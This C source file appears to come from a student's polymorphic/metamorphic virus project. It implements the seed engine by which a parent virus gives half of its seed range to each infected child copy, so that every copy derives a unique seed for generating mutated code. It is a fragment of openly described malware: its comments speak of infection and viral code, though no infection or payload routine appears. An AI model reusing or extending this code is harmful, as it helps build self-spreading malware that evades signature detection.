/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   polymorphic_seed.c                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/12 18:29:06 by anselme           #+#    #+#             */
/*   Updated: 2019/12/27 02:10:16 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdbool.h>
#include <stdint.h>

#include "loader.h"
#include "log.h"

/*
** The polymorphic_seed_engine:
**   - assigns new seeds for the son (initializes son_seed[2])
**   - returns a unique_seed for the son metamorphic generation
**   - it SHOULD be the only function WITH WRITE ACCESS to the father seeds
**   - it SHOULD be the only function WITH WRITE ACCESS to the son seed!
**   - father_seed[2] is a pointer to the viral code!
**
** Seed ownership:
**
**   The uint64_t father_seed[2] is the range of seeds that belongs to our virus
**   father_seed[0] XOR client_id is the unique_seed of the current virus.
**   father_seed[1] is the last seed that belongs to the current virus.
**   All the numbers that aren't in this range are owned by other UNIQUE copies
**   of this virus.
**
**   When a new virus is bred, the parent gives away a part of his seed range
**   to his child, losing ownership of the range given.
**
**   (1)    father[n, m]
**   (2)    father infects son
**   (3)    father[n, p] and son[p + 1, m] with n < p < m
**
*/

static uint64_t	*access_virus_seeds(void)
{
	struct virus_header	*global_header = (void *)virus_header_struct;

	return global_header->seed;
}

uint64_t	polymorphic_seed_engine(uint64_t son_seed[2], uint64_t client_id)
{
	uint64_t	*father_seed = access_virus_seeds();
	const uint64_t	range_length = father_seed[1] - father_seed[0];

	log_old_father_seeds(father_seed);

	son_seed[1]    = father_seed[1];
	son_seed[0]    = father_seed[0] + range_length / 2 + 1;
	father_seed[1] = father_seed[0] + range_length / 2;

	uint64_t unique_seed = son_seed[0] ^ client_id;

	log_all_seeds(father_seed, son_seed, client_id, unique_seed);

	return unique_seed;
}
